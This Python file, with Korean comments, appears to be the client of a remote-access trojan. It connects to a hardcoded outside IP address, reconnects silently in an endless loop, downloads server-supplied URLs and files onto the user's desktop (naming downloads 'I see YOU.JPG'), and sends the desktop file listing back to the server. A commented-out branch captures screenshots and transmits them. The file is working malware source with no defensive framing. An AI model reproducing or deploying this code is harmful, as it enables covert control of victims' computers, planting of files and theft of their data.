import socket
from urllib.request import urlretrieve as urlre
import getpass
import random
from os.path import exists
import os.path
import time
import pyautogui 
import pickle
import numpy as np
from io import BytesIO 


import os 

class connect() : # 기본 class





    def __init__(self , port=2006) : # 접속
        self.clint = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.clint.connect(('210.95.148.229' , port))
        print(' - connect - ')
    

    def list_file(self , target) :  # 파일 정보 
        self.files = os.listdir(target) 
        self.lists = ""
        self.lists += str(self.targets + '?')
        for self.i in self.files :
            self.lists += str(str(self.i) + '?')
        return self.lists


    def send_data(self) : # 받은 데이터 처리 
            self.data = self.clint.recv(1024)
            self.data = str(self.data.decode('utf-8'))
            self.clint.send('   '.encode('utf-8'))
            print(self.data.replace('link!','').replace('file!' ,''))
            self.targets = 'C:/Users/' + getpass.getuser() + '/desktop/'
            
##################################################################################################
            # 받은 데이터가 링크 일 경우 #
            if 'link!' in self.data : 
                try :
                    self.data = str(self.data).replace('link!','') # 링크 
                    self.link_N = 0 
                    self.pc_name =  self.targets # 파일경로 
                    self.LINK_NM = 'I see YOU.JPG' # 파일 이름 
                    if  exists(self.pc_name + str(self.link_N) + self.LINK_NM) : # 바탕화면에 같은 파일이 있으면
                        while True :                                        # 앞에 숫자를 바꿔서 다운 
                            self.link_N += 1 
                            if not exists(self.pc_name +str(self.link_N) +self.LINK_NM) :
                                urlre(self.data, self.pc_name +str(self.link_N) +self.LINK_NM)
                                self.clint.send('-- success --'.encode('utf-8'))
                                break
                    else :            
                        urlre(self.data, self.pc_name +str(self.link_N) +self.LINK_NM)
                        self.clint.send('-- download link success --'.encode('utf-8'))
                except : 
                    self.clint.send('-- error , not link --'.encode('utf-8'))
###################################################################################################
            # 받은 데이터가 파일인 경우 #
            elif 'file!' in self.data :
                self.file_name = os.path.basename(self.data.replace('file!',''))
                self.way = self.targets
                with open(self.way + self.file_name , 'wb') as file_ :
                    try :
                        
                        self.data = self.clint.recv(1024) # 사이즈 
                        
                        self.buff = int(self.data.decode('utf-8')) # 사이즈 인코딩
                        self.data = self.clint.recv(self.buff)  # 파일 받기  버퍼사이즈 많큼
                        file_.write(self.data) # 파일 저장 
                        file_.close()
                        
                        
                        self.clint.send('-- success load file --'.encode('utf-8'))
                        print('-- success load file --')
                    except : 
                        self.clint.send('-- failed load file --'.encode('utf-8'))
                        print('-- failed load file --')
#################################################################################################
            # 받은 데이터가 파일 목록 명령일경우 
            elif 'listf!' in self.data :
                try :
                    self.data = str(self.list_file(self.targets))
                    self.clint.send(self.data.encode('utf-8'))   
                    print('-- success send file list --')
                except :
                    self.clint.send('-- failed load file list --'.encode('utf-8'))
                    print('-- failed load file list --') 
################################################################################################
            # elif 'screen!' in self.data :# 스크린 명령일 경우 
            #     # try :
            #     #     self.screen = pyautogui.screenshot()# 스크린샷
            #     #     self.screen = np.array(self.screen) # 넘파이로 변환 
            #     #     self.data = pickle.dumps(self.screen) # 피클 변환
            #     #     self.clint.send(self.data)
            #     #     print('-- send screen success --')
            #     # except :
            #     #     self.clint.send('-- failed send screen list --'.encode('utf-8'))
            #     #     print('-- send screen failed --')
            #     try :
            #         self.image = pyautogui.screenshot()
            #         self.image = np.array(self.image)
            #         # print(self.image.shape) 
            #         self.np_bytes = BytesIO() 
            #         np.save(self.np_bytes, self.image, allow_pickle=True) 
            #         self.np_bytes = self.np_bytes.getvalue() 
            #         self.clint.send(self.np_bytes)
                    
            #     except : 
            #         print('error')


################################################################################################
            else : 
                try:
                    self.clint.send('-- load message success --'.encode('utf-8'))    # 데이터를 받으면 기본 출력 
                    print('-- load message success --')   
                except :
                    self.clint.send('-- load message failed --'.encode('utf-8'))





# 연결 끊길시 자동 연결 
while True :
    try : 
        A = connect()
        while True : 
            A.send_data()
            
    except : 
        None
            
            
